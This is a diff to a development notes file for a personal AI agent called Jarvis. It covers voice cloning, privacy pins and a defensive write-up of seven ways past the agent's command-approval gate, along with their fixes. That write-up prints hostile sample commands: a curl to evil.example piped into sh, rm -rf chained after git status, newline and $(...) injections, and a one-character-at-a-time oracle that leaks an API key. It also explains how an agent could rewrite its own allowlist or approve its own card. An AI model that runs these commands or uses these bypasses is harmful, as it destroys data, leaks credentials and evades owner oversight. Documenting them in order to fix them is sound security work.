+- **`voice.catalog()` is the one list** — Kokoro bundle + pocket builtins +
+  the custom store, each `{name, backend, kind}`; `set_voice`/`voice_for`
+  validate against it. `available_voices()` stays Kokoro-only on purpose
+  (tests and the language map key off the bundle). `pocket.available()`
+  answers without importing torch (`sys.modules` first — which is also what
+  lets the test fake work — then `find_spec`), so `import jarvis.voice`
+  never drags the ML stack in.
+- **Creating a voice is the owner's act, never the agent's.** `jarvis voice
+  clone <name> <audio…>` and `jarvis voice mix <name> a=0.6 b=0.4` are CLI
+  subcommands (the `jarvis auth` pattern) with a consent confirmation —
+  the pocket-tts license prohibits cloning without the speaker's lawful
+  consent, so there is no clone tool and no HUD upload. `jarvis voice
+  list|say|rename|rm` complete the set; `say` writes a WAV and plays it via
+  paplay/aplay when it can. The store is `config.VOICES_DIR`
+  (`JARVIS_VOICES`, default `~/.local/share/jarvis/voices/<name>/` —
+  voice.json + state.safetensors + the reference audio), **outside the repo
+  like sessions and never committed**: clones are audio of real people.
+  `.gitignore` carries a `voices/` backstop anyway. Directories are built
+  aside and renamed into place so a crashed clone never leaves a half-voice.
+- **Hybrids are experimental, and fail loudly.** pocket-tts has no native
+  mixing, so `mix` blends the *exported* states per tensor (weights
+  normalized; shapes differing in exactly one axis — the prompt-length one —
+  slice to the shortest keeping the head, so positions stay aligned;
+  anything stranger is a ValueError). `_blend` is written with plain
+  operators so the free suite runs it on numpy while production runs torch.
+  Judged by ear via `jarvis voice say`; the documented fallback for a bad
+  blend is a multi-file clone, which concatenates reference audio instead.
+- **The HUD picker now spans backends.** `/voices` returns grouped entries
+  plus `override`; the picker's first row is AVATAR DEFAULT (`POST /voice`
+  with `""` clears `_voice_override` — the picker used to outrank every
+  avatar forever with no way back), and rows carry KOKORO / POCKET / CLONE /
+  HYBRID badges. Still `textContent`-built, still same-origin.
+
+Live smoke findings (2026-08-20, pocket-tts 2.1.0, torch 2.13.0+cpu via
+`UV_TORCH_BACKEND=cpu` — the resolver did land a clean CPU wheel on 3.14):
+
+- **The probe answered every unknown the right way.** sample_rate is 24000
+  (never assumed); output floats sit in [-1, 1] so `_repad`'s 0.01 floor
+  applies unchanged; generation ran 780–1871ms per chunk on this CPU —
+  under the face's 2500ms SLOW threshold for ordinary sentences; and
+  `generate_audio` does **not** mutate the state it is passed (exported
+  before/after, byte-identical), so `_state` needs no defensive clone.
+- **The exported state is small and fixed-shape**: 12 tensors — per-layer
+  `self_attn/cache` float32 `(2, 1, 126, 16, 64)` plus an int64 `offset` —
+  and the cache capacity is fixed at 126, so two voices' states are
+  *shape-identical* and `_blend`'s one-axis slicing is a safety net rather
+  than the common path. The int64 offsets do differ per prompt, which is
+  why `_blend` takes the elementwise **minimum** for integer tensors: a
+  blended position only counts as valid if it is valid in every component,
+  and "first wins" would have made the mix order-dependent.
+- **Mixing works on real tensors**: `jarvis voice mix smoke-blend alba=0.5
+  marius=0.5` wrote a hybrid whose state loads through the normal store
+  path and synthesizes real speech (4.0s for the standard test line)
+  through the full `voice.tts()` routing and the HUD-facing surfaces.
+  Whether it *sounds* like a plausible blend is the owner's ear-call —
+  A/B WAVs were handed over; `smoke-blend` is left in the store to audition
+  from the picker (`jarvis voice rm smoke-blend` when done).
+- **The `BUILTINS` list is exactly the library's catalog** — the failure
+  message below printed all 26, matching name for name.
+- **A quiet reference clones into a quiet voice** (found on the owner's
+  first real clone, 2026-08-21): the model carries the prompt's loudness
+  into everything it synthesizes — a peak-0.09 laptop-mic take produced
+  output ~7x quieter than the builtins. `pocket.clone` therefore
+  normalizes decodable reference audio to a healthy speech level
+  (`_REF_RMS` with a `_REF_PEAK` clipping ceiling) before prompting;
+  measured fix: output rms 0.0125 → 0.0746, in line with builtins. Files
+  the stdlib cannot decode (mp3 and friends) still pass through at their
+  recorded level.
+- **Voice cloning is gated upstream — resolved 2026-08-20.** The
+  cloning-capable weights require accepting the terms at
+  huggingface.co/kyutai/pocket-tts and a local `hf auth login` (the venv's
+  own `.venv/bin/hf`, no apt install); without them, builtins and *mixes of
+  builtins* work fine, a clone attempt fails with the library's own clear
+  message, and the build-aside store logic leaves no half-voice behind
+  (verified — that failure path ran for real). The owner accepted the terms
+  and logged in same day; cloning was then validated live: clone → speak,
+  2.6s of valid WAV — **with `HF_HUB_OFFLINE=1` for the whole run**, which
+  is the proof the privacy pins below rest on.
+
+**The privacy pins (2026-08-20, owner's ask: reference audio and cloned
+states must never share a connection with the internet).** They never could
+— there is no upload path anywhere in pocket-tts or Jarvis, and the only
+network use is *downloading* weights — but two pins remove even the
+metadata residue and harden the at-rest story:
+
+- **Jarvis processes default to HF offline** (`config.py`, right after
+  `_load_dotenv`): `HF_HUB_OFFLINE=1` unless `JARVIS_HF_OFFLINE=0`, set
+  before anything can import `huggingface_hub` (config is every
+  entrypoint's first import; both TTS backends load lazily). This kills the
+  hub client's version-check requests and download telemetry, so synthesis
+  and cloning provably touch no network at all. It holds because
+  **everything is prefetched**: both model variants (the gated cloning one
+  and the fallback) and all 26 builtin voice states are in
+  ~/.cache/huggingface. The cost, documented in the comment: anything
+  needing a *fresh* Hub fetch — a pocket-tts upgrade, a new machine, a
+  swecompare dataset refresh — needs `JARVIS_HF_OFFLINE=0` for that one
+  run. An explicit `HF_HUB_OFFLINE` in the environment always wins.
+- **The voice store is owner-only** (`pocket._store_root`): 0700 on the
+  root and every voice directory (mkdtemp is 0700 by construction and
+  `os.replace` keeps the mode) — a cloned voice is reference audio of a
+  real person plus the state to speak as them, which is
+  credential-adjacent, so it gets the token-file treatment.
+
+  Both pins are in `tests/voice_pocket_check.py` (`hardening_checks`:
+  fresh-subprocess env matrix for the offline default and its two
+  overrides, and the 0700 modes).
 
 **Onshape CAD shipped (2026-07-31), live validation pending.** The second
 use-but-never-see integration (see Safety design). `jarvis auth onshape`
@@ -2176,6 +2710,257 @@ defects and are the owner's to make:
   invariant 7. The volatile blocks ride a rebuilt-every-step block at the tail
   now, so a `plan_write` no longer invalidates the whole prefix cache.
 
+**Gate round 3 (2026-08-17) — seven ways past the approval gate, all fixed
+together.** A security pass found them; every one was confirmed by execution
+against the real code before anything was changed, and every regression case
+added here was verified to **fail** against the unfixed source before being
+kept. All 47 free suites pass afterwards. The unifying shape is worth more than
+any single fix: **each was a second, older copy of an idea that `rules.py`
+already had right.** Two implementations of "where does one command end" drift,
+and the more permissive copy is the one that decides.
+
+- **The allowlist was one word wide** (`permissions.py`) — the worst of them.
+  `allows()` matched `command.split()[0]`, one first word for the entire line,
+  and `gate()` returned True on that *before* the surface approver was ever
+  called. So a single owner-created `{"tool": "run_command", "prefix": "git"}`
+  — the entry you get by answering ALWAYS to one `git status` — made
+
+      git status && rm -rf ~/projects
+      git status; curl http://evil.example/x.sh | sh
+
+  run with **no CLI prompt, no HUD card and no Discord DM**, on every surface,
+  goal runs included, and past the fetch-execute reviewer as well. rules.py had
+  judged every segment with worst-verdict-wins since the day it shipped; the
+  allowlist beside it was still reading one token. It now asks
+  `rules.command_stems()` and requires **all** stems to be covered — an
+  allowlist entry must never authorise a segment the owner did not allowlist.
+
+  What kept it from being total, and is worth knowing because it is the design
+  working: **DENY was unreachable this way.** `dispatch()` evaluates
+  `permissions.command_verdict()` *before* calling the approver, so `git status
+  && sudo rm -rf /` was still refused outright. The secrets layer also still
+  won, and background workflows were untouched (`workflows.py` passes a bare
+  `_deny`, never `permissions.gate`). The hole was exactly the ASK verdict —
+  which is the gate.
+
+  Second half of the same bug: `entry_for()` only attached a prefix when the
+  command was non-empty, so a **whitespace-only** `run_command` — which the
+  schema accepts, since `required` only rejects an *absent* key — produced a
+  prefix-less `{"tool": "run_command"}`, and `allows()` read `prefix is None`
+  as "the whole tool". One ALWAYS press permanently widened the gate from one
+  stem to every command, with nothing in the JSON to say so. `entry_for` now
+  raises `NotAllowlistable` for that and for compound commands (one click must
+  not mint a blanket grant per stem that happened to share the line), and a
+  prefix-less command entry authorises nothing however it got there. Raising
+  rather than returning None is deliberate: `ApprovalBroker.resolve` already
+  treats a failing on_always hook as "the approval stands, but this is not an
+  *always*", so the decision log stays honest with no edit to the
+  SELF_PROTECTED broker.
+
+- **Nothing froze the gate's data** (`tools/files.py`). SELF_PROTECTED freezes
+  the gate's *code*; `_self_protected()` decided by `relative_to(REPO_ROOT)`
+  and returned False on ValueError, so everything outside the checkout was
+  unprotected **by construction** — and `config.ALLOWLIST_PATH` is
+  deliberately outside it. `allowlist.json` is not a credential name, so
+  secrets.py did not cover it; neither write tool is `dangerous`. So
+  `read_file` (satisfying read-before-write) plus one ungated `edit_file`
+  wrote `[{"tool": "run_command"}]`, `load_allowlist()` re-reads on every
+  check, and the very next dangerous call was auto-approved — every surface,
+  no restart, nobody asked, and afterwards indistinguishable from an entry the
+  owner created. Both write tools are in `workflows.SAFE_TOOLS` and
+  `SUBAGENT_TOOLS`, so a background workflow that cannot run a dangerous tool
+  *itself* could unlock the owner's surfaces.
+
+  The fix keys on the **identity of the file** — a resolved-path check in
+  `_self_protected`, which both write tools already call — rather than on its
+  position relative to the repo. Not by adding the name to
+  `secrets.PROTECTED_NAMES`: it is not a credential, it must stay *readable*
+  (the owner and the HUD both inspect it), and borrowing the credential
+  refusal would tell the model something untrue about why. It is read from
+  `config` per call, so a suite that repoints `ALLOWLIST_PATH` at a temp file
+  protects the temp file. Still reachable by an *approved* `run_command`,
+  which is the same deliberate exception SELF_PROTECTED already makes.
+
+  Generalises: **freezing the code that reads a decision is not freezing the
+  decision.** Any future gate that persists state needs its state named here
+  the day it is added.
+
+- **`grep_files` returned credential files through ripgrep** (`tools/search.py`).
+  The filter was `is_protected(ln.split(":", 1)[0])` — the first
+  colon-delimited field of an output *line* — which recognises exactly one of
+  rg's output shapes. Three escaped: **context lines** are attributed with `-`,
+  not `:`, so `context_lines>0` returned every non-matching line of a bundle in
+  the window; given a **single file** as `path` rg prints no filename at all,
+  so the field tested was a line number and `grep_files('KEY', '.env')`
+  returned the file verbatim at the default `context_lines=0`; and **count**
+  mode on a single file emits a bare number, turning a protected file into a
+  match oracle (`^OPENROUTER_API_KEY=sk-or-v1-F` answers 1 or 0, one character
+  at a time) that `dispatch()`'s value-scrub cannot touch because no secret
+  value is ever in the output. The pure-Python fallback had none of them — it
+  filters whole *files* before reading them — so this is the gitignore bug
+  again: **two backends, two answers, decided by which binaries are installed.**
+
+  Fixed by giving rg `--null --with-filename`, so the path is always present
+  and is separated by a byte no path can contain, then filtering per file and
+  re-rendering the fallback's exact shapes. A record that cannot be attributed
+  to a file is dropped: this is a credential filter, so "unrecognised" has to
+  mean "withheld".
+
+- **`run_readonly` had two ways to run a second command** (`tools/shell.py`),
+  and it is `dangerous=False` — no rule, no approval, no allowlist entry — so
+  its operator denylist is the *entire* boundary. A bare **newline** and a bare
+  **`&`** were both missing: `run_readonly("ls\ntouch PWNED")` returned
+  `[exit 0]` and the file was there. `rules.segments()` had always known
+  newlines separate commands; this hand-copied version of the same idea did
+  not. `<` joined the list because input redirection also glues a filename to a
+  binary (`cat<.env`). And the tool now judges the command **after
+  `rules.unwrap()`**, because `env` is on its allowlist and `env -C /tmp sh -c
+  'cat .env'` was therefore a "read-only" call that printed a live credential.
+
+  Its git guard was also a denylist of seven writing subcommands, so `git rm`,
+  `git mv`, `git restore`, `git pull`, `git stash`, `git apply`,
+  `git cherry-pick`, `git revert`, `git gc` and `git config --global` all ran
+  unattended (verified: `git rm -f f.txt` deleted the file). It is an
+  allowlist now, with a listing-form rule for the dual-mode subcommands —
+  `git branch` and `git branch -a` read, `git branch -D x` does not.
+
+- **`rules.segments()` did not split on a bare `&`** — so `ls & rm -rf ~/work`
+  was *one* segment, the `rm` was read as arguments to `ls`, and the line was
+  ALLOW. That is the module's headline invariant failing on the cheapest
+  possible spelling, and an ALLOW at a human-backed surface is auto-approved.
+  The split is now **quote-aware**, which it had to become in the same change:
+  splitting the raw string on `&` drags `git commit -m 'fix A & B'` into an
+  approval prompt, and the same flaw was already there for `;` and `|`, just
+  rarer. **A fix that makes ordinary work ask is a different bug, not a smaller
+  one.** Unbalanced quotes fall back to the naive split, which over-segments.
+
+- **Two rules were defeated by deleting a space**, both because shlex merges an
+  operator or flag into its operand. `echo pwned>~/.bashrc` splits into
+  `['echo', 'pwned>~/.bashrc']`, so the token test saw no redirect and the
+  2026-08-10 fix for `echo pwned > ~/.bashrc` was reachable again; the redirect
+  scan now reads the raw segment with quote state. And `python -c"import os"`
+  splits into `['python', '-cimport os']`, so the exact-token test saw no `-c`
+  — the rule whose whole purpose is that allowing the stem must not allow the
+  language was allowing the language.
+
+- **`secrets.protected_in_command` and `_drop_attributed_lines` shared a
+  parser gap.** Layer 2 treated every shlex token as a path and took its
+  basename, so `cat<.env`, `sh -c 'cat .env'`, `env sh -c 'cat .env'`,
+  `python -c "open('.env')"`, `F=.env; cat $F` and `cat $(echo .env)` were all
+  invisible; the raw line is scanned too now, with boundaries that keep
+  `.env.example` and `.envrc` readable. Layer 3 — the scrub at `dispatch()`,
+  the one CLAUDE.md calls the one that matters — understood only `path:...`
+  and `==> path <==`, so grep's **context** attribution `path-N-text` walked a
+  `.env` straight past it, silently, with the "[N line(s) … withheld]" counter
+  still printing so the output looked filtered. `-`, tab and NUL are
+  understood now; `:` is still tried first so a path containing a `-` is not
+  cut short.
+
+  The accepted cost, recorded because it is a real trade: layer 2 now refuses
+  `git commit -m "ignore .env"` for naming a file it only mentions. That is
+  the deliberate direction — a refusal the model can rephrase past is cheaper
+  than a credential in the transcript, which is only fixable by rotating a key.
+
+- **`uiatree.forbidden_title()` was narrower than what it backstops**
+  (`windows/uiatree.py`). It was exact string equality while `bridge.py`
+  resolves a registered app's window by *substring*, so any window-manager
+  suffix defeated it: `forbidden_title("J.A.R.V.I.S.")` was True and
+  `forbidden_title("J.A.R.V.I.S. - Google Chrome")` was False — the HUD opened
+  in an ordinary browser tab rather than app mode was attachable, and an agent
+  that can drive the window holding the authorization card can approve itself.
+  Substring now. Nothing pinned the literals to reality either, so renaming
+  either page's `<title>` silently disarmed the check;
+  `tests/desktop_check.py` reads both `<title>` tags out of the real HTML now,
+  the same drift guard `hud_avatar_check` applies to `WAKE_PATTERNS`. Still
+  mitigated in practice by `DESKTOP_APPS` registering no browser.
+
+**Narrowing that round (2026-08-17, same day).** An adversarial pass over the
+fixes above found four places where they were too broad, and this project's own
+rule is that **a fix that makes ordinary work ask is a different bug, not a
+smaller one** — a boundary that refuses ordinary work does not get respected,
+it gets routed around, and an owner asked to approve `git stash list` learns to
+approve without reading. All four were narrowed without reopening anything; the
+evidence is a before/after verdict table over a 3,747-command corpus, in which
+**every** difference is one of these four and nothing moved in the strict
+direction except two holes deliberately closed (below).
+
+- **`2>&1` prompted.** Detail and edges in *Command rules* above. Headline:
+  the redirect check was a raw scan for `>`, which is a larger set than
+  "writes to a path".
+- **`run_readonly` refused ten pure git reads.** `git branch --contains HEAD`,
+  `git branch --list 'feat*'`, `git tag -l 'v*'`, `git remote get-url origin`,
+  `git config --get user.name`, `git worktree list`, `git submodule status`,
+  `git stash list`, `git bisect log`, `git notes list`. Two causes: the
+  listing rule demanded that **every** remaining token start with `-`, so any
+  read carrying a *value* was refused; and `bisect` was in neither set. The
+  subcommands are now split by *how* they say "read" — `GIT_SUBSUB_READS` for
+  the ones that dispatch again (`remote get-url`, `worktree list`),
+  `GIT_CONFIG_READ_FLAGS` for `config` (which writes by simply being given a
+  name and a value, so the *absence* of a reading flag is what refuses it),
+  and a positional-count rule for `branch`/`tag`, where a leftover positional
+  is a name to create unless `-l`/`--list` turned positionals into patterns.
+  Every writing form is still refused, including two the widening could
+  plausibly have swept up: **bare `git stash` is `git stash push`**, the one
+  member of that family where doing nothing writes, and **`-a` is `--all` for
+  `git branch` but `--annotate` for `git tag`**, so treating it as a listing
+  flag would have made tag creation look like a read.
+- **`run_readonly`'s operator check was not quote-aware**, unlike the
+  `segments()` it was written beside — so `grep 'a&b' f.txt` and `git log
+  --grep='fix & bug'` errored. It reuses `rules.first_unquoted()` now rather
+  than carrying a second hand-written copy of the idea, **which was the actual
+  defect**: one idea in two files is how the two files disagreed. `$(` and
+  backticks are scanned with `double_is_quote=False`, because a double quote
+  is not protection from something the shell expands right through it.
+- **Full-path allowlist entries were dead.** See *Permission modes* above.
+
+**And the one this narrowing broke, caught by a differential sweep rather than
+by a test.** Making the operator scan escape-aware was *correct* — the shell
+does not treat `\;` as a separator either — but `find` is on `run_readonly`'s
+allowlist, so `find . -exec rm -rf {} \;` went REFUSED → RAN. It had only ever
+been refused **by accident**, as a raw `;` in an operator scan, and the moment
+the accident stopped happening there was nothing behind it. Worse, the sweep
+showed `find / -delete` and `find . -exec rm {} +` carry no separator at all
+and had been running unattended the whole time. `run_readonly` now asks
+`rules.writes_anyway()` — the same list `rules.py` already used to pull
+`find`/`sed` back to ASK — so the writing forms are refused by name and flag,
+where it belongs, and the reading forms still run. Two lessons: **a guard that
+only works as a side effect of another guard is not a guard**, and a
+loosening deserves a differential sweep, because the thing it un-blocks is by
+definition something no existing test was asserting.
+
+**And the second one it broke — the same shape, one layer down, found by an
+independent adversarial pass and fixed 2026-08-17.** The shared scanner's
+`double_is_quote=False` was implemented as *"treat `"` as an ordinary
+character"*, which is not what it means. A `'` inside a double-quoted string is
+an apostrophe, but that spelling let it open a single-quote region that ran to
+the end of the line — so the `$(…)` sitting behind it was never scanned, and
+
+    run_readonly("grep \"it's $(touch /tmp/PWNED)\" f")
+    run_readonly("echo \"don't `touch /tmp/PWNED`\"")
+
+**both executed, verified live**, creating the file and returning `[exit 0]`.
+That is arbitrary code execution through a `dangerous=False`, ungated tool that
+background workflows and goal runs hold — precisely the hole the same day's
+`ls\ntouch PWNED` fix had closed, reopened by the fix for that fix's
+over-reach. The committed pre-round code caught it, because a dumb
+`"$(" in command` substring scan has no quoting model to get wrong.
+
+`unquoted_indices()` now always tracks **both** quote kinds with real nesting
+(a `'` inside `"…"` is text, a `"` inside `'…'` is text), and `double_is_quote`
+decides only whether the *contents* of a double-quoted run are reported —
+never whether `"` still delimits one. `grep "it's ; ok" f` still runs, because
+that `;` genuinely is inside double quotes.
+
+The lesson is the one `_READONLY` already taught, one level more general:
+**a scanner is only correct together with the quoting rules it models**, and
+replacing a crude check with a modelled one trades a false-positive problem for
+a false-*negative* one. The crude version fails loudly and annoyingly; the
+modelled version fails silently and permissively. So every narrowing of a
+security scan needs its exploit re-run, not just its friction case — the
+regression cases live at the end of `READONLY_MUST_REFUSE` in
+`tests/rules_check.py`, alongside direct `first_unquoted` assertions, and are
+verified to fail against the intermediate version.
+
 **long-bench shipped (2026-08-15)** — `longbench/`, the ruler the *Not done*
 list had been asking for since 2026-08-01. It is the first bench here that
 **does not import Jarvis**: a task is a pure `plan(seed, scale)`, a
@@ -2268,6 +3053,32 @@ Two operational lessons from the same run:
 list wants the loop to act on. The measurement now exists; the loop still does
 nothing with it.
 
+**Attended background tasks shipped (2026-08-20)** — the conversation agent
+stays a responsive chat thread and hands real work to background "task" agents
+whose approvals reach the owner. Details and safety reasoning in *Safety
+design* ("Attended background tasks can ask"); mechanics: `tasks.py` (the
+workflows.py shape with the captured approver and a `cancel` Event),
+`tools/tasks.py` (task_start / task_status / task_log / task_cancel — the
+start tool captures `runtime.approver()`), `runtime.origin()` (the
+attribution ContextVar the broker reads at request time), an origin line on
+the HUD card and the Discord DM, task lifecycle SSE (`tasks.set_notify`, the
+face broadcasts it into the OPERATIONS ticker), and a `## Background tasks`
+section in the working-context block for task-armed agents — the
+confabulation lesson applied: task status the surface can see is status the
+transcript must carry too. Decisions made with the owner, recorded so they
+are not relitigated: **tasks inherit the foreground gate whole** (allowlist +
+ALLOW rules auto-run off-screen; wrapping the approver to force asks would
+both strip the human-backed flag and teach approve-without-reading), and
+**both verbs stay** — `task_start` is the default background delegation,
+`workflow_start` the never-interrupt variant (agent-bench's `orchestrate`
+pins its own toolset, so its multiagent rating is unaffected). The delegation
+policy lives in the `config.py` system prompt: inline for
+quick/conversational/interactive work, `task_start` for self-contained jobs
+with a clear deliverable, `run_subagent` when the answer is needed before
+replying, `workflow_start` only when the owner must not be pinged.
+`tests/tasks_check.py` is the free suite (16 suites re-run green after the
+change, including every approval, workflow, goal, daemon and HUD suite).
+
 ### PENDING LIVE VALIDATION — needs API keys (delete this section once done)
 
 Everything above was built and tested in a sandbox with **no `OPENROUTER_API_KEY`**,
@@ -2313,6 +3124,15 @@ CLAUDE.md once it has been, with the results folded into the notes above:**
    in the face's persistent agent into an unrelated conversation. The model can
    clear it with `plan_write("")`. Check in live use whether it does, or
    whether the plan needs to expire.
+6. **Does the model actually delegate to `task_start`?** (Added 2026-08-20.)
+   The mechanism is tested; the *prompting* is not — the same bet as
+   `plan_write`'s. Run `jarvis face`, ask for a real job ("refactor X", "write
+   me a report on Y") and keep talking: does he start a task and stay
+   conversational, or grind through it inline? Does an approval card raised by
+   the task carry its label, and does he read `task_log` before summarizing
+   results instead of inventing them? And the inverse failure: does he
+   delegate two-step jobs that were cheaper inline? If the judgment is off,
+   the delegation paragraph in `config.py` is what needs work, not the tools.
 
 Later: real integrations (calendar/email), scheduled proactive runs, and
 more registered desktop apps as they earn their place (each is one entry in
